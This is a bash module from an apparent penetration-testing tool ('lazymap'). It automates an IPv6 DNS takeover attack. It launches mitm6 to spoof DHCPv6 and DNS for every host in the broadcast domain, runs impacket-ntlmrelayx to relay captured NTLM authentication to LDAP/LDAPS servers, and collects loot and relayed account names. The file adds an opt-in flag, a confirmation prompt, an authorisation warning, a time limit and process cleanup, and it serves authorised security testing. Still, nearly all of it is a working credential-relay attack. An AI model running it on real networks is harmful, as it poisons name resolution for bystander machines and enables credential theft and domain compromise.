#!/usr/bin/env bash

# scans/mitm6.sh
# IPv6 DNS Takeover test (mitm6 + impacket-ntlmrelayx).
#
# Unlike every other test in lazymap, this one is ACTIVE: mitm6 answers DHCPv6
# solicits and spoofs DNS for the whole broadcast domain, and ntlmrelayx relays
# the authentication it captures. It affects hosts beyond the target list, so it
# only runs when explicitly requested with --mitm6, is bounded by a timer, and
# asks for confirmation unless -y was given.

source "$LAZYMAP_DIR/lib/compat.sh"
source "$LAZYMAP_DIR/lib/colors.sh"
source "$LAZYMAP_DIR/lib/domain.sh"

MITM6_DEFAULT_DURATION=300
MITM6_PID=""
RELAY_PID=""

# Resolve the impacket relay binary under either of its packaged names.
resolve_ntlmrelayx() {
    if command -v impacket-ntlmrelayx &>/dev/null; then
        printf 'impacket-ntlmrelayx'
    elif command -v ntlmrelayx.py &>/dev/null; then
        printf 'ntlmrelayx.py'
    else
        printf ''
    fi
}

# Build the LDAP/LDAPS relay target list from the nmap LDAP results.
# ntlmrelayx against LDAP normally fails on signing, so 636 is preferred.
collect_mitm6_targets() {
    local output_dir="$1"
    local gnmap="$output_dir/nmap/LDAP.gnmap"
    local out="$output_dir/mitm6/relay_targets.txt"
    : > "$out"

    [ -f "$gnmap" ] || return 0

    local ip
    while IFS= read -r ip; do
        [ -n "$ip" ] && echo "ldaps://$ip" >> "$out"
    done < <(awk '/^Host: / && /Ports:.*636\/open\// {print $2}' "$gnmap" | sort -u)

    if [ ! -s "$out" ]; then
        while IFS= read -r ip; do
            [ -n "$ip" ] && echo "ldap://$ip" >> "$out"
        done < <(awk '/^Host: / && /Ports:.*389\/open\// {print $2}' "$gnmap" | sort -u)
        [ -s "$out" ] && echo -e "${YELLOW}No LDAPS (636) hosts found; falling back to LDAP (389). Relaying may fail if signing is enforced.${NC}"
    fi
}

mitm6_confirm() {
    local iface="$1" domain="$2" duration="$3" count="$4"

    echo -e "\n${BLUE}======================================================${NC}"
    echo -e "${YELLOW}⚠  Active attack: IPv6 DNS Takeover (mitm6)${NC}"
    echo -e "${BLUE}======================================================${NC}"
    echo -e "${CYAN}Interface     : ${iface}${NC}"
    echo -e "${CYAN}Domain        : ${domain}${NC}"
    echo -e "${CYAN}Relay targets : ${count}${NC}"
    echo -e "${CYAN}Duration      : ${duration}s${NC}"
    echo -e "${BLUE}------------------------------------------------------${NC}"
    echo -e "${RED}This spoofs DHCPv6 and DNS for every Windows host in this${NC}"
    echo -e "${RED}broadcast domain, not just the targets, and relays the${NC}"
    echo -e "${RED}credentials it captures. Only run it with authorisation${NC}"
    echo -e "${RED}covering this network segment.${NC}"
    echo -e "${BLUE}======================================================${NC}"

    if [ "$ASSUME_YES" = true ]; then
        echo -e "${YELLOW}-y given, proceeding without confirmation.${NC}\n"
        return 0
    fi
    if [ ! -t 0 ]; then
        echo -e "${YELLOW}Not an interactive terminal. Skipping. Use -y to run it unattended.${NC}\n"
        return 1
    fi

    echo -e "${YELLOW}Type the interface name (${iface}) to start, anything else to skip:${NC}"
    local reply
    read -r reply
    reply="${reply//$'\r'/}"
    if [ "$reply" = "$iface" ]; then
        echo
        return 0
    fi
    echo -e "${YELLOW}Skipping the mitm6 test.${NC}\n"
    return 1
}

# Kill a process and the children it spawned. mitm6 and ntlmrelayx keep
# poisoning the network until they are actually gone, so this must not miss.
mitm6_kill_tree() {
    local pid="$1"
    [ -n "$pid" ] || return 0
    kill -0 "$pid" 2>/dev/null || return 0
    pkill -TERM -P "$pid" >/dev/null 2>&1
    kill -TERM "$pid" >/dev/null 2>&1
    local waited=0
    while [ "$waited" -lt 5 ]; do
        kill -0 "$pid" 2>/dev/null || return 0
        sleep 1
        waited=$(( waited + 1 ))
    done
    pkill -KILL -P "$pid" >/dev/null 2>&1
    kill -KILL "$pid" >/dev/null 2>&1
    return 0
}

mitm6_stop() {
    mitm6_kill_tree "$MITM6_PID"
    mitm6_kill_tree "$RELAY_PID"
    MITM6_PID=""
    RELAY_PID=""
    sleep 1
}

# Verify nothing survived, and say so loudly if it did.
mitm6_verify_stopped() {
    local leftover
    leftover=$(pgrep -f 'mitm6 -d|ntlmrelayx' 2>/dev/null | grep -c . )
    if [ "$leftover" -gt 0 ]; then
        echo -e "${RED}Warning: ${leftover} mitm6/ntlmrelayx process(es) are still running.${NC}"
        echo -e "${RED}Stop them before leaving the network: pkill -f mitm6; pkill -f ntlmrelayx${NC}"
    else
        echo -e "${GREEN}mitm6 and ntlmrelayx stopped; the network is no longer being poisoned.${NC}"
    fi
}

# Pull the evidence out of the relay log: which accounts authenticated and
# whether anything was written to the loot directory.
summarise_mitm6() {
    local output_dir="$1"
    local relay_log="$2"
    local mitm6_log="$3"
    local loot_dir="$4"

    local relayed=""
    if [ -f "$relay_log" ]; then
        relayed=$(grep -aoE 'Authenticating connection from [^ ]+ against [^ ]+ SUCCEED' "$relay_log" \
                  | sed -E 's/Authenticating connection from //; s/ against .*//' | sort -u)
    fi

    local spoofed=0
    [ -f "$mitm6_log" ] && spoofed=$(grep -ac 'Sent spoofed reply' "$mitm6_log")

    local loot_count=0
    [ -d "$loot_dir" ] && loot_count=$(find "$loot_dir" -type f 2>/dev/null | grep -c .)

    echo -e "${BLUE}------------------------------------------------------${NC}"
    echo -e "${CYAN}Spoofed DNS replies sent : ${spoofed}${NC}"
    echo -e "${CYAN}Loot files written       : ${loot_count}${NC}"

    if [ -n "$relayed" ]; then
        local count
        count=$(printf '%s\n' "$relayed" | grep -c .)
        echo -e "${RED}Relayed authentications  : ${count}${NC}"
        printf '%s\n' "$relayed" | while IFS= read -r u; do
            [ -n "$u" ] && echo -e "${GREEN}    + $u${NC}"
        done
        printf '%s\n' "$relayed" > "$output_dir/mitm6/relayed_accounts.txt"
        echo -e "${RED}VULNERABLE: IPv6 DNS takeover succeeded and authentication was relayed.${NC}"
    elif [ "$spoofed" -gt 0 ]; then
        echo -e "${YELLOW}DNS was spoofed successfully but no authentication was relayed in ${MITM6_LAST_DURATION}s.${NC}"
        echo -e "${YELLOW}IPv6 is reachable and answering; try a longer --mitm6-time during business hours.${NC}"
    else
        echo -e "${GREEN}No DHCPv6/DNS activity observed. IPv6 takeover does not appear exploitable here.${NC}"
    fi
    echo -e "${BLUE}------------------------------------------------------${NC}"
}

run_mitm6_scan() {
    local output_dir="$1"

    echo -e "${YELLOW}Starting IPv6 DNS Takeover test (mitm6).${NC}\n"

    local iface
    iface="$(opt_get mitm6_interface)"
    [ -z "$iface" ] && iface="$(opt_get responder_interface)"
    if [ -z "$iface" ]; then
        echo -e "${RED}No interface specified. Use --mitm6-interface <iface> (or --interface). Skipping.${NC}\n"
        return 0
    fi

    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}mitm6 and ntlmrelayx need root. Re-run with sudo. Skipping.${NC}\n"
        return 0
    fi

    if ! command -v mitm6 &>/dev/null; then
        echo -e "${RED}'mitm6' is not installed ('pipx install mitm6'). Skipping.${NC}\n"
        return 0
    fi
    local relay_bin
    relay_bin="$(resolve_ntlmrelayx)"
    if [ -z "$relay_bin" ]; then
        echo -e "${RED}impacket's ntlmrelayx is not installed ('pipx install impacket'). Skipping.${NC}\n"
        return 0
    fi
    local domain
    domain="$(resolve_ad_domain "$output_dir")"
    if [ -z "$domain" ]; then
        echo -e "${YELLOW}Could not determine the Active Directory domain.${NC}"
        echo -e "${YELLOW}Skipping the mitm6 test. Re-run with --domain <REALM> to enable it.${NC}\n"
        return 0
    fi

    mkdir -p "$output_dir/mitm6"
    collect_mitm6_targets "$output_dir"
    local targets_file="$output_dir/mitm6/relay_targets.txt"
    if [ ! -s "$targets_file" ]; then
        echo -e "${YELLOW}No LDAP/LDAPS relay targets found. Skipping the mitm6 test.${NC}\n"
        return 0
    fi

    local duration
    duration="$(opt_get mitm6_duration)"
    [ -z "$duration" ] && duration="$MITM6_DEFAULT_DURATION"
    MITM6_LAST_DURATION="$duration"

    local target_count
    target_count=$(grep -c . "$targets_file")

    if [ -n "$(opt_get responder_interface)" ]; then
        echo -e "${YELLOW}Note: Responder is also running. Both answer WPAD, which can spoil the${NC}"
        echo -e "${YELLOW}relay. Consider running the mitm6 test on its own.${NC}\n"
    fi

    mitm6_confirm "$iface" "$domain" "$duration" "$target_count" || return 0

    local loot_dir="$output_dir/mitm6/loot"
    local relay_log="$output_dir/mitm6/ntlmrelayx.log"
    local mitm6_log="$output_dir/mitm6/mitm6.log"
    mkdir -p "$loot_dir"

    # WPAD host in the fwpad.<domain> form. DNS is case-insensitive, so the
    # realm's own casing is kept.
    local wpad_host
    wpad_host="fwpad.$domain"

    local relay_target_arg
    if [ "$target_count" -eq 1 ]; then
        relay_target_arg="-t $(head -n1 "$targets_file")"
    else
        relay_target_arg="-tf $targets_file"
    fi

    # Launched as direct children so the Ctrl+C handler, which terminates this
    # script's children, also tears the attack down.
    echo -e "${GREEN}Starting ntlmrelayx against ${target_count} target(s).${NC}"
    echo -e "${CYAN}  $relay_bin -6 $relay_target_arg -wh $wpad_host -l $loot_dir${NC}"
    "$relay_bin" -6 $relay_target_arg -wh "$wpad_host" -l "$loot_dir" > "$relay_log" 2>&1 &
    RELAY_PID=$!
    sleep 3

    echo -e "${GREEN}Starting mitm6 on ${iface} for domain ${domain}.${NC}"
    echo -e "${CYAN}  mitm6 -d $domain -i $iface${NC}"
    mitm6 -d "$domain" -i "$iface" > "$mitm6_log" 2>&1 &
    MITM6_PID=$!

    printf '%s\n%s\n' "$RELAY_PID" "$MITM6_PID" > "$output_dir/mitm6/pids.txt"

    sleep 2
    if ! kill -0 "$RELAY_PID" 2>/dev/null && ! grep -aq 'Servers started' "$relay_log" 2>/dev/null; then
        echo -e "${RED}ntlmrelayx exited immediately. Last output:${NC}"
        tail -n 5 "$relay_log" 2>/dev/null | sed 's/^/    /'
        mitm6_stop
        return 0
    fi
    if ! kill -0 "$MITM6_PID" 2>/dev/null; then
        echo -e "${RED}mitm6 exited immediately. Last output:${NC}"
        tail -n 5 "$mitm6_log" 2>/dev/null | sed 's/^/    /'
        mitm6_stop
        return 0
    fi

    echo -e "${YELLOW}Running for ${duration}s. Press Ctrl+C to abort the whole scan.${NC}"
    local waited=0
    local step=15
    while [ "$waited" -lt "$duration" ]; do
        sleep "$step"
        waited=$(( waited + step ))
        [ "$waited" -gt "$duration" ] && waited="$duration"
        local hits=0
        [ -f "$relay_log" ] && hits=$(grep -ac 'SUCCEED' "$relay_log")
        echo -e "${CYAN}  ${waited}/${duration}s elapsed - relayed authentications so far: ${hits}${NC}"
    done

    echo -e "${GREEN}Stopping mitm6 and ntlmrelayx.${NC}"
    mitm6_stop
    mitm6_verify_stopped

    summarise_mitm6 "$output_dir" "$relay_log" "$mitm6_log" "$loot_dir"
    echo -e "${BLUE}IPv6 DNS Takeover test completed. Output saved to $output_dir/mitm6.${NC}\n"
}
